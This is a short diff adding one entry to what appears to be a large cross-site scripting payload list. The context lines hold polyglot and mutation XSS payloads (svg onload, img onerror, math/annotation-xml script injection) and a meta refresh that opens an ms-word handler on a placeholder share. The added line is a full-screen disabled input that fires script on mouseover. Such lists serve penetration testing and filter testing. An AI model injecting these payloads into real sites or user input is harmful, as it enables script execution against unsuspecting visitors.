@@ -1720,3 +1720,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <meta http-equiv="refresh" content="0;url=ms-word:ofe|u|\\SITE/word.docx"/>
 <math><annotation-xml><textarea/><svg><script>alert(1)</script>
 <img onerror=event.path.pop().alert(1) src>
+<input disabled style="position:fixed;top:0;left:0;border:999em solid red;" onmouseover="alert(1)">
